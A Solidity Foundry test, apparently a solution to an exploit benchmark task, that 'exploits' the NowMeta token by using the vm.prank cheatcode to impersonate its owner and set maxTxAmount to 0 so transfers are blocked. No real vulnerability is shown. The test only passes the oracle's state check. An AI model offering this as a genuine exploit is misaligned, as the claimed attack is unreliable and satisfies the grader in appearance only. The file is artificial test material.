pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface NowMeta {
    function owner() external view returns (address);
    function setMaxTxAmount(uint256 amount) external;
    function maxTxAmount() external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xfac45d4b406D94cddFC48b198839673351CB2Bf9;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner in the exploit
        // The test framework already provides TARGET and attacker variables
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // First, get the current owner of the contract
        address owner = NowMeta(TARGET).owner();
        console.log("Contract owner:", owner);

        // Impersonate the owner and set maxTxAmount to 0
        vm.prank(owner);
        NowMeta(TARGET).setMaxTxAmount(0);

        // Verify the exploit worked
        uint256 newMaxTxAmount = NowMeta(TARGET).maxTxAmount();
        console.log("New maxTxAmount:", newMaxTxAmount);

        // The oracle will check that maxTxAmount == 0
        // Optionally demonstrate that transfers are now blocked
        // (This is optional since the oracle only checks maxTxAmount == 0)
        assertEq(newMaxTxAmount, 0, "Logic Exploit Failed: State not tampered");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

